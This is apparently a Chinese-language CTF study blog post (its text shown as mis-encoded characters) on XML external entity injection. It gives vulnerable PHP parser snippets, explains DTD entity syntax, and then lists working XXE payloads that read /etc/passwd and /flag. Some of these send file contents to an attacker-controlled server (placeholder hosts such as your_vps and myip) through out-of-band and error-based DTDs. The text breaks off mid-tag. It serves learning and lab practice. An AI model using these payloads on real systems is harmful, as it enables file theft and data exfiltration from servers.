        <content type="html"><![CDATA[<p>æœ¬ç¯‡åšå®¢ç®€å•ä»‹ç»äº†XXEæ¼æ´çš„åŸç†å’Œå¸¸è§åˆ©ç”¨æ–¹å¼ï¼ï¼ï¼</p><a id="more"></a><h2 id="ä»€ä¹ˆæ˜¯XXE"><a href="#ä»€ä¹ˆæ˜¯XXE" class="headerlink" title="ä»€ä¹ˆæ˜¯XXE?"></a>ä»€ä¹ˆæ˜¯XXE?</h2><p>XXEæ¼æ´å…¨ç§°<code>XML External Entity Injection</code>ï¼Œå³xmlå¤–éƒ¨å®ä½“æ³¨å…¥æ¼æ´</p><p>æœ‰å¯èƒ½é€ æˆæ–‡ä»¶è¯»å–ã€å‘½ä»¤æ‰§è¡Œã€å†…ç½‘ç«¯å£æ‰«æã€æ”»å‡»å†…ç½‘ç½‘ç«™ã€å‘èµ·dosæ”»å‡»ç­‰å±å®³</p><p>xxeæ¼æ´è§¦å‘çš„ç‚¹å¾€å¾€æ˜¯å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶çš„ä½ç½®ï¼Œæ²¡æœ‰å¯¹ä¸Šä¼ çš„xmlæ–‡ä»¶è¿›è¡Œè¿‡æ»¤ï¼Œå¯¼è‡´å¯ä¸Šä¼ æ¶æ„xmlæ–‡ä»¶</p><h2 id="XXEæ¼æ´ä»£ç "><a href="#XXEæ¼æ´ä»£ç " class="headerlink" title="XXEæ¼æ´ä»£ç "></a>XXEæ¼æ´ä»£ç </h2><p>ä»¥buuojä¸ŠRealéƒ¨åˆ†<code>[PHP]XXE</code>ä¸ºä¾‹ï¼Œä¸Šé¢æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼š</p><p><strong>simplexml_load_string.phpï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p><strong>SimpleXMLElement.phpï¼š</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">$xml = <span class="keyword">new</span> SimpleXMLElement($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p><strong>dom.php:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line"></span><br><span class="line">print_r($dom);</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥æ„é€ ä¸‹é¢çš„payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">name</span> <span class="meta-keyword">ANY</span> &gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=/var/www/html/dom.php&quot;</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>äº†è§£XXEä¸€å®šè¦äº†è§£XMLä¸€äº›ç»å¸¸ä½¿ç”¨çš„è¯­æ³•ï¼</p><p>XMLæ–‡æ¡£ç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt; &lt;!--XMLç”³æ˜--&gt;</span><br><span class="line">&lt;!--æ–‡æ¡£ç±»å‹å®šä¹‰--&gt;</span><br><span class="line">&lt;!DOCTYPE note [ &lt;!--å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ note ç±»å‹çš„æ–‡æ¡£--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--å®šä¹‰noteå…ƒç´ æœ‰å››ä¸ªå…ƒç´ --&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--å®šä¹‰toå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--å®šä¹‰fromå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--å®šä¹‰headå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--å®šä¹‰bodyå…ƒç´ ä¸ºâ€#PCDATAâ€ç±»å‹--&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Mooback&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;Moonback&lt;&#x2F;from&gt;</span><br><span class="line">&lt;head&gt;XXE&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;I am learning XML.&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><p>ç”¨æµè§ˆå™¨æ‰“å¼€å¯ä»¥çœ‹åˆ°<br><img src="/2019/12/14/xxe-study/20191214205015.png"></p><h3 id="DTDå®ä½“"><a href="#DTDå®ä½“" class="headerlink" title="DTDå®ä½“"></a>DTDå®ä½“</h3><p>å®ä½“æ˜¯å¯¹æ•°æ®çš„å¼•ç”¨ã€‚</p><p>å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ï¼Œä¸€èˆ¬åˆ†ä¸ºå­—ç¬¦å®ä½“ï¼Œå‘½åå®ä½“ï¼Œå¤–éƒ¨å®ä½“ï¼Œå‚æ•°å®ä½“ï¼Œæ‰€æœ‰å®ä½“ï¼ˆé™¤å‚æ•°å®ä½“å¤–ï¼‰éƒ½ä»¥ä¸€ä¸ªä¸å­—ç¬¦ï¼ˆ&amp;ï¼‰å¼€å§‹ï¼Œä»¥ä¸€ä¸ªåˆ†å·ï¼ˆ;ï¼‰ç»“æŸã€‚</p><p><strong>å­—ç¬¦å®ä½“ï¼š</strong></p><p>å¯¹äºå­—ç¬¦å®ä½“ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨åè¿›åˆ¶æ ¼å¼ï¼ˆ<code>&amp;#nnn;</code>ï¼Œå…¶ä¸­ <em>nnn</em> æ˜¯å­—ç¬¦çš„åè¿›åˆ¶å€¼ï¼‰æˆ–åå…­è¿›åˆ¶æ ¼å¼ï¼ˆ<code>&amp;#xhhh;</code>ï¼Œå…¶ä¸­<em>hhh</em> æ˜¯å­—ç¬¦çš„åå…­è¿›åˆ¶å€¼ï¼‰æ¥æŒ‡å®šä»»æ„ Unicode å­—ç¬¦ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼šå¤§å†™å­—æ¯ A æ˜¯ Unicode å­—ç¬¦ <code>U+0065</code>ã€‚å¦‚æœæƒ³å°†å…¶è¡¨ç¤ºä¸ºä¸€ä¸ªå­—ç¬¦å®ä½“ï¼Œå¯ä»¥è¾“å…¥ <code>&amp;#65;</code>ï¼ˆåè¿›åˆ¶å€¼ï¼‰æˆ– <code>&amp;#xa9;</code>ï¼ˆåå…­è¿›åˆ¶å€¼ï¼‰</p><p><strong>å‘½åå®ä½“(å†…éƒ¨å®ä½“)ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br></pre></td></tr></table></figure><p>å‘½åå®ä½“åœ¨ DTD æˆ–å†…éƒ¨å­é›†ï¼ˆå³æ–‡æ¡£ä¸­ &lt;!DOCTYPE&gt; è¯­å¥çš„ä¸€éƒ¨åˆ†ï¼‰ä¸­å£°æ˜ï¼Œåœ¨æ–‡æ¡£ä¸­ç”¨ä½œå¼•ç”¨ã€‚åœ¨ XML æ–‡æ¡£è§£æè¿‡ç¨‹ä¸­ï¼Œå®ä½“å¼•ç”¨å°†ç”±å®ƒçš„è¡¨ç¤ºæ›¿ä»£ã€‚</p><p><strong>å¤–éƒ¨å®ä½“:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>å¤–éƒ¨å®ä½“è¡¨ç¤ºå¤–éƒ¨æ–‡ä»¶çš„å†…å®¹ï¼Œåœ¨æœ‰äº›æƒ…å†µä¸‹å¾ˆæœ‰ç”¨ï¼Œæ¯”å¦‚è¯´ï¼Œæ‚¨åœ¨åˆ›å»ºä¸€æœ¬å›¾ä¹¦å¹¶ä¸”æƒ³å°†æ¯ä¸€ç« å­˜å‚¨ä¸ºä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ã€‚æ‚¨å¯èƒ½ä¼šåˆ›å»ºä¸€ç»„å¦‚ä¸‹æ‰€ç¤ºçš„å®ä½“ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY chap1 SYSTEM &quot;chapter-1.xml&quot;&gt;</span><br><span class="line">&lt;!ENTITY chap2 SYSTEM &quot;chapter-2.xml&quot;&gt;</span><br><span class="line">&lt;!ENTITY chap3 SYSTEM &quot;chapter-3.xml&quot;&gt;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ï¼Œå½“æ‚¨åœ¨ä¸»å›¾ä¹¦ XML æ–‡ä»¶ä¸­å°†è¿™äº›å®ä½“æ”¾åˆ°ä¸€èµ·æ—¶ï¼Œè¿™äº›æ–‡ä»¶çš„å†…å®¹å°†æ’å…¥åœ¨å¼•ç”¨ç‚¹ã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">chap1</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;chapter-1.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">chap2</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;chapter-2.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">chap3</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;chapter-3.xml&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">&amp;chap1;</span></span><br><span class="line"><span class="meta">&amp;chap2;</span></span><br><span class="line"><span class="meta">&amp;chap3;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>ç”±äºè¿™äº›æ–‡ä»¶çš„å†…å®¹è¢«æ’å…¥åˆ° XML æ–‡æ¡£ä¸­ï¼Œå› æ­¤å®ƒä»¬ä¹Ÿå¿…é¡»æ˜¯æœ‰æ•ˆçš„ XMLï¼Œè€Œä¸”å®ƒä»¬å¿…é¡»æ˜¯å¹³è¡¡çš„.å½“ä¸Šé¢çš„ XML æ–‡æ¡£è¢«è§£ææ—¶ï¼Œå®ƒå°†è¢«è¯»å–ä¸ºä¸€ä¸ªå¤§æ–‡æ¡£ï¼ŒåŒ…å« <code>chapter-1.xml</code>ã€<code>chapter-2.xml</code> å’Œ <code>chapter-3.xml</code> æ–‡ä»¶çš„å†…å®¹ã€‚</p><p><strong>å‚æ•°å®ä½“ï¼š</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br><span class="line">æˆ–è€…</span><br><span class="line">&lt;!ENTITY % å®ä½“åç§° SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>å‚æ•°å®ä½“åªç”¨äº DTD å’Œæ–‡æ¡£çš„å†…éƒ¨å­é›†ä¸­ã€‚å®ƒä»¬ä½¿ç”¨ç™¾åˆ†å·ï¼ˆ%ï¼‰è€Œä¸æ˜¯ä¸å­—ç¬¦ï¼Œå¯ä»¥æ˜¯å‘½åå®ä½“æˆ–å¤–éƒ¨å®ä½“ã€‚</p><p><strong>æ³¨æ„ç‚¹ï¼š</strong></p><ul><li>å‚æ•°å®ä½“å¿…é¡»å®šä¹‰åœ¨å•ç‹¬çš„DTDæ–‡æ¡£ä¸­æˆ–XMLæ–‡æ¡£çš„DTDåŒº(ä½†æ˜¯å¼•ç”¨åªèƒ½åœ¨DTDæ–‡æ¡£ä¸­ï¼Œå³å¤–éƒ¨å­é›†ï¼Œè€Œä¸èƒ½åœ¨XMLæ–‡æ¡£çš„DTDåŒº)ï¼Œå‰è€…ä¸ºè¯¥XMLæ–‡æ¡£çš„å¤–éƒ¨å­é›†ï¼Œåè€…ä¸ºè¯¥XMLæ–‡æ¡£çš„å†…éƒ¨å­é›†ã€‚</li><li>å‚æ•°å®ä½“çš„ä½œç”¨æ˜¯ä½œä¸ºDTDä¸­çš„å…ƒç´ çš„æ¡ä»¶æ§åˆ¶ã€‚å‚æ•°å®ä½“å®šä¹‰ä»¥%ä½œä¸ºå¼€å¤´ï¼Œå¼•ç”¨ä¹Ÿä»¥%å¼€å¤´ï¼Œä»¥;ç»“å°¾</li></ul><p>è¯­æ³•å¼•ç”¨å¤–éƒ¨çš„å®ä½“ï¼Œè€Œéå†…éƒ¨å®ä½“ï¼Œé‚£ä¹ˆURLä¸­èƒ½å†™å“ªäº›ç±»å‹çš„å¤–éƒ¨å®ä½“å‘¢ï¼Ÿ</p><p>ä¸»è¦çš„æœ‰fileã€httpã€httpsã€ftpç­‰ç­‰ï¼Œå½“ç„¶ä¸åŒçš„ç¨‹åºæ”¯æŒçš„ä¸ä¸€æ ·ï¼š<br><img src="/2019/12/14/xxe-study/1.png"></p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="ä»»æ„æ–‡ä»¶è¯»å–"><a href="#ä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="ä»»æ„æ–‡ä»¶è¯»å–"></a>ä»»æ„æ–‡ä»¶è¯»å–</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://yourhost/test.xml&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;ticket&gt;&lt;username&gt;&amp;file;&lt;&#x2F;username&gt;&lt;code&gt;dsad&lt;&#x2F;code&gt;&lt;&#x2F;ticket&gt;</span><br></pre></td></tr></table></figure><h4 id="å¼•å…¥æœåŠ¡å™¨DTDæ–‡ä»¶Blind-XXE-OOB"><a href="#å¼•å…¥æœåŠ¡å™¨DTDæ–‡ä»¶Blind-XXE-OOB" class="headerlink" title="å¼•å…¥æœåŠ¡å™¨DTDæ–‡ä»¶Blind XXE(OOB)"></a>å¼•å…¥æœåŠ¡å™¨DTDæ–‡ä»¶Blind XXE(OOB)</h4><p><strong>ç¬¬ä¸€ç§æ–¹å¼ï¼š</strong></p><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://your_vps/test.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%all;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;send;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p>vpsä¸Šçš„test.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;your_vps&#x2F;get.php?file&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼šå¦‚æœå®šä¹‰æˆå‚æ•°å®ä½“çš„è¯<code>%</code>éœ€è¦å®ä½“ç¼–ç </p><p><strong>ç¬¬äºŒç§æ–¹å¼:</strong></p><p>è‡ªå·±vpsä¸Šçš„dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;myip:10001&#x2F;?%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://myip/xml.dtd&quot;</span>&gt;</span>  </span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;php://filter/read=convert.base64-encode/resource=file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">    %send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span>1234<span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨çš„<code>php://filter</code>å°†æ–‡ä»¶å†…å®¹è¿›è¡Œäº†base64ç¼–ç ï¼Œå› ä¸ºå½“æˆ‘ä»¬è¯»å–çš„æ–‡ä»¶æ˜¯phpæˆ–åˆ™htmlæ–‡ä»¶æ—¶ï¼Œæ–‡ä»¶çš„ä»£ç åŒ…å«<code>&lt; &gt;</code>ç¬¦å·æ—¶ä¼šå¯¼è‡´è§£æé”™è¯¯</p><p>è®©å­˜åœ¨æ¼æ´çš„åœ°æ–¹å…ˆåŠ è½½è‡ªå·±æœåŠ¡å™¨ä¸Šçš„dtdæ–‡ä»¶ï¼Œç„¶åè®©å…¶è¯·æ±‚å¹¶å¸¦ä¸Šåˆ©ç”¨phpä¼ªåè®®base64åŠ å¯†çš„æ–‡ä»¶å†…å®¹ï¼Œé€šè¿‡æœåŠ¡ç«¯çš„æ—¥å¿—å³å¯åšåˆ°ä¸å›æ˜¾çš„ä»»æ„æ–‡ä»¶è¯»å–</p><p><strong>ç¬¬ä¸‰ç§æ–¹å¼:</strong></p><p>vpsä¸Šçš„<code>test.dtd</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1:9001?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;yourvps&#x2F;test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;msg&gt;&lt;id&gt;moonback&lt;&#x2F;id&gt;&lt;name&gt;aasd&lt;&#x2F;name&gt;&lt;level&gt;1000&lt;&#x2F;level&gt;&lt;time&gt;415441&lt;&#x2F;time&gt;&lt;&#x2F;msg&gt;</span><br></pre></td></tr></table></figure><p>è¿™ç§çš„å¥½å¤„æ˜¯æ²¡æœ‰<code>file://</code>,<code>php://filter</code>ç­‰å…³é”®è¯</p><h4 id="åŸºäºæŠ¥é”™çš„Blind-XXE"><a href="#åŸºäºæŠ¥é”™çš„Blind-XXE" class="headerlink" title="åŸºäºæŠ¥é”™çš„Blind XXE"></a>åŸºäºæŠ¥é”™çš„Blind XXE</h4><p>åŸºäºæŠ¥é”™çš„åŸç†å’ŒOOBç±»ä¼¼ï¼ŒOOBé€šè¿‡æ„é€ ä¸€ä¸ªå¸¦å¤–çš„urlå°†æ•°æ®å¸¦å‡ºï¼Œè€ŒåŸºäºæŠ¥é”™æ˜¯æ„é€ ä¸€ä¸ªé”™è¯¯çš„urlå¹¶å°†æ³„éœ²æ–‡ä»¶å†…å®¹æ”¾åœ¨urlä¸­ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼è¿”å›æ•°æ®</p><p><strong>é€šè¿‡å¼•å…¥æœåŠ¡å™¨æ–‡ä»¶</strong></p><p>xml.dtd</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;file:&#x2F;&#x2F;&#x2F;hhhhhhh&#x2F;%file;&#39;&gt;&quot;&gt;</span><br><span class="line">%start;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;you_vps&#x2F;xml.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    %remote;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p><strong>é€šè¿‡å¼•å…¥æœ¬åœ°æ–‡ä»¶</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE message [</span><br><span class="line">    &lt;!ENTITY % remote SYSTEM &quot;&#x2F;usr&#x2F;share&#x2F;yelp&#x2F;dtd&#x2F;docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &#39;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; send SYSTEM &amp;#x27;file:&#x2F;&#x2F;hhhhhhhh&#x2F;?&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;send;</span><br><span class="line">    &#39;&gt; </span><br><span class="line">    %remote;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;message&gt;1234&lt;&#x2F;message&gt;</span><br></pre></td></tr></table></figure><p>CoogleCTFä¸Šçš„ä¸€é“é¢˜ï¼š<a href="https://bnv.web.ctfcompetition.com/">é“¾æ¥</a>    <a href="https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2">writeup</a></p><p>payloadï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 